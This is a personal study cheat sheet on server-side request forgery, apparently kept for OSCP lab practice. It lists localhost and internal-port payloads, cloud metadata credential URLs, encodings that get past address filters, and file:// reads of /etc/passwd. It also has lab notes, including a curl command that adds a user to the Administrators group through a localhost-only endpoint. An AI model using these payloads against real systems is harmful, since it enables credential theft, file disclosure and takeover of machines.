# SSRF (Server-Side Request Forgery)

See also: [[Web-Methodology]]

## Basic Test Payloads

```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
```

## Internal Port Scanning

```
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:8080
http://127.0.0.1:6379
```

Script it - iterate common ports and check response size/time differences.

## Cloud Metadata (unlikely OSCP, good to know)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Bypass Filters

```
http://0x7f000001 (hex)
http://2130706433 (decimal)
http://127.1 (short form)
http://0177.0.0.1 (octal)
http://127.0.0.1.nip.io (DNS rebinding)
http://[0:0:0:0:0:ffff:REDACTED]
```

## File Read via SSRF

```
file:///etc/passwd
file:///c:/windows/system32/drivers/etc/hosts
```

## Use Cases

- Access internal services not exposed externally
- Read local files with `file://` protocol
- Hit internal admin panels (e.g., `http://127.0.0.1:8080/admin`)
- Access internal APIs
- Pivot to internal network hosts (`http://10.0.0.x/`)

## From Your Boxes

> **Love** (HTB) - SSRF via URL input box on staging subdomain to reach internal admin panel
> - What worked: Entered `http://localhost:5000` into the URL scanner, which returned internal password dashboard creds
> - Used creds (`admin:REDACTED!!!!`) to log into the voting admin panel and chain with file upload RCE
> - Lesson: If a web app has a "URL scanner/checker" feature, immediately try localhost and internal ports

> **Nickel** (PG/Windows) - Internal API command endpoint accessible only from localhost
> - What worked: `curl 'http://localhost:8080/?Add-LocalGroupMember%20-Group%20Administrators%20-Member%20ariah'`
> - Discovered via PDF document mentioning "Temporary Command Endpoint" at `http://nickel/?`
> - Lesson: Internal documentation/notes can reveal localhost-only endpoints. SSRF or local access turns these into RCE
